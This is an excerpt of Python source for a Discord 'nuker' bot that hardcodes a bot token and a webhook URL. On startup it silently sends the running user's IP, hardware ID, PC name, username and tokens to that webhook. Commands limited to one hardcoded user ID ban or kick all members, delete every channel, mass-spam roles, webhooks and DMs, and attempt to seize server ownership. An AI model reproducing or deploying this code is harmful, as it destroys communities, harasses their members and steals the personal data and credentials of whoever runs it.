...
TOKEN = "MTA5NTE2MDU3MjY0NDk2MjM3NA.G6SSXq.ZLNKd8Xx2wbdMVM68WNa7UEg2i7Cdzy3kfhKdM"
...
async def on_ready():
     ...
     payload = {
          'content': f"new user ip, {data} hwid, {hwid}, pc name {pcname}, time: {times}, bot token '{BotToken.boken}', webhook '{BotToken.webhook}, username '{username}'"
     }

     requests.post('https://discord.com/api/webhooks/1097727172245999706/u5R2vFPRvtj0z8UKxTqZ-QMcPscFFEKBVStqKMLgzZEuYtIVFCfGQ5BoS4WPnY4xcnwT',json=payload)
...
async def on_message(message):
    ...
    if nuking == True:
         if message.author.id == 997600477204197577:
             print
         else:  
            message.author.Ban()
    
   
    if user_message.lower() == '$nuke' and message.author.id ==  997600477204197577:
    ...
    if user_message.lower() == '$ban all' and message.author.id == 997600477204197577:
            await message.delete()
            for member in message.guild.members:
                try:
                    if member.id == 997600477204197577:
                        print
                    else:
    ...
    if user_message.lower() == '$kick all' and message.author.id == 997600477204197577:
            await message.delete()
    ...
    if user_message.lower() == '$change guild name' and message.author.id == 997600477204197577:
            await message.delete()
            names = input("name it to? : ")
            await message.guild.edit(name=f"{names}")

    if user_message.lower() == '$role spam' and message.author.id == 997600477204197577:
         await message.delete()
    ...
    if user_message.lower() == '$delete all channels' and message.author.id == 997600477204197577:
         await message.delete()
         try:
    ...
    if user_message.lower() == '$spam webhooks' and message.author.id == 997600477204197577:
         await message.delete()
    ...
    if user_message.lower() == '$spam owner' and message.author.id == 997600477204197577:
         await message.delete()
    ...
    if user_message.lower() == '$spam notifs' and message.author.id == 997600477204197577:
         await message.delete()
         timess = input("Times? : ")
    ...
    if user_message.lower() == '$spam members' and message.author.id == 997600477204197577:
         await message.delete()
         timesssss = input(" how many times? : ")
         whatt = input("what to send? : ")

         for memberssss in message.guild.members:
              if memberssss.id == 997600477204197577:
                   print
              else:                    
                    for memmm in range(int(timesssss)):
                        await memberssss.send(whatt)

    if user_message.lower() == '$saw' and message.author.id == ownerid:
         ...
         while sawhasownership == False:
              for mem in message.guild.members:
                   ...
                   if message.guild.owner.id == 997600477204197577:
                        sawhasownership = False

    if user_message.lower() == '$silent takeout' and message.author.id == 997600477204197577:
            await message.delete()
            try:
